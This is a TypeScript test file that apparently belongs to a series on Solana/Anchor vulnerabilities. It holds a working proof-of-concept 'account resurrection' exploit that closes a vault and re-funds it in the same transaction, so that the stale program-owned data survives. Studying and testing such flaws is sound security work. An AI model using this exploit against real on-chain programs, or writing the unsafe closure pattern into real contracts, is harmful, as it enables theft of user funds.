/**
 * EXPLOIT TEST: Unsafe Account Closure (Anchor)
 * 
 * This test demonstrates the "Account Resurrection" vulnerability.
 * 
 * Vulnerability: The `close_vault` instruction transfers lamports to 0 but does NOT:
 * 1. Zero out the account data.
 * 2. Reassign the owner to the System Program.
 * 
 * Exploit Scenario:
 * 1. User calls `close_vault`. Account lamports -> 0.
 * 2. In the SAME TRANSACTION, Attacker transfers lamports back to the vault address.
 * 3. The account is "resurrected" with its old data intact because it wasn't purged yet.
 * 4. The account remains owned by the Program, with valid state, effectively bypassing closure.
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { PublicKey, Keypair, SystemProgram, LAMPORTS_PER_SOL, Transaction } from "@solana/web3.js";
import { BN } from "bn.js";

describe("05-unsafe-account-closure: Anchor Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const PROGRAM_ID = new PublicKey("CZqKx8VFNjKT4h8YqvLLN9vZ3qWKFQvXYrJJMWJWWNnL");

    it("Resurrects closed account with intact data in same transaction", async () => {
        console.log("\nüéØ EXPLOIT: Unsafe Account Closure (Anchor)\n");

        const idl = await Program.fetchIdl(PROGRAM_ID, provider);
        if (!idl) {
            throw new Error("IDL not found. Make sure the program is deployed.");
        }
        const program = new Program(idl, PROGRAM_ID, provider);

        const user = Keypair.generate();
        console.log("üë§ User:", user.publicKey.toBase58());

        // Airdrop SOL
        const airdropSig = await provider.connection.requestAirdrop(
            user.publicKey,
            2 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropSig);

        // Derive vault PDA
        const [vaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), user.publicKey.toBuffer()],
            PROGRAM_ID
        );
        console.log("üè¶ Vault PDA:", vaultPda.toBase58());

        // Step 1: Initialize
        console.log("\nüìù Step 1: Initialize vault...");
        await program.methods
            .initialize()
            .accounts({
                user: user.publicKey,
                vault: vaultPda,
                systemProgram: SystemProgram.programId,
            })
            .signers([user])
            .rpc();

        // Deposit some funds to make it interesting (optional, but shows state persistence)
        await program.methods
            .deposit(new BN(0.5 * LAMPORTS_PER_SOL))
            .accounts({
                user: user.publicKey,
                vault: vaultPda,
                systemProgram: SystemProgram.programId,
            })
            .signers([user])
            .rpc();

        // Verify initial state
        let vaultAccount = await program.account["vault"].fetch(vaultPda);
        console.log(`‚úÖ Initial Balance: ${vaultAccount.balance.toString()}`);

        // Step 2: EXPLOIT - Close and Resurrect in same transaction
        console.log("\nüö® Step 2: Attempting 'Resurrection Attack'...");

        const closeIx = await program.methods
            .closeVault()
            .accounts({
                user: user.publicKey,
                vault: vaultPda,
            })
            .instruction();

        const resurrectIx = SystemProgram.transfer({
            fromPubkey: user.publicKey,
            toPubkey: vaultPda,
            lamports: await provider.connection.getMinimumBalanceForRentExemption(8 + 32 + 8),
        });

        const tx = new Transaction().add(closeIx).add(resurrectIx);
        await provider.sendAndConfirm(tx, [user]);

        // Step 3: Verify Resurrection
        console.log("‚úÖ Transaction confirmed: Close + Refund");

        // If the account was safely closed, it should be either:
        // a) Owned by System Program (if transferred to)
        // b) Or data zeroed out / discriminator invalid

        // BUT since it's vulnerable, we expect to fetch it successfully as a 'Vault' account
        try {
            const resurrectedVault = await program.account["vault"].fetch(vaultPda);
            console.log(`\nüí• EXPLOIT SUCCESSFUL!`);
            console.log(`üíÄ Resurrected Identity: ${resurrectedVault.owner.toBase58()}`);
            console.log(`üíÄ Resurrected Balance: ${resurrectedVault.balance.toString()} (Old state persisted!)`);

            // Assert data persisted
            if (resurrectedVault.balance.toString() === vaultAccount.balance.toString()) {
                console.log("‚úÖ Old data persisted perfectly. Account is alive and owned by Program.");
            } else {
                throw new Error("Data mismatch");
            }

        } catch (e) {
            console.log("‚ùå Exploit failed? Account could not be fetched.");
            throw e;
        }
    });
});
